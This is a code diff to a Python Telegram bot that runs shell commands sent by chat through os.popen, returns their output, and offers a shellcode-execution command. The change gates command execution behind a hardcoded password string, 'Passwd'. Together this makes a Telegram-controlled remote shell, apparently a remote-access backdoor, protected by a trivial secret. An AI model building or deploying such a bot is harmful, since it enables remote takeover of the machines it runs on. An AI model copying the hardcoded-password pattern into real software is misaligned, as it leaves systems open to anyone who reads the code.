@@ -30,6 +30,8 @@ except ImportError:
 API_TOKEN = 'YOUR_API_KEY_HERE'
 BOTMASTER_ID = 00000000
 VERBOSE = True
+# use /command Passwd cmd.
+Server_ID = "Passwd"
 
 bot = telepot.Bot(API_TOKEN)
 
@@ -50,8 +52,19 @@ def handle_message(msg):
         type_command, argument_command = parse_command(received_command)
 
         if type_command == "command":
-            proc = os.popen(argument_command)
-            send_message(proc.read())
+            
+            # Add command Passwd by catbaron
+            sid_cmd = argument_command.strip().split(' ', 1)
+            #print argument_command
+            if len(sid_cmd) != 2 or sid_cmd[0] != Server_ID:
+                #print sid_cmd
+                return
+            else:
+                cmd = sid_cmd[1]
+                proc = os.popen(cmd)
+                send_message(proc.read())
+            #proc = os.popen(argument_command)
+            #send_message(proc.read())
 
         elif type_command == "shellcode":
             response_shellcode = execute_shellcode(argument_command)
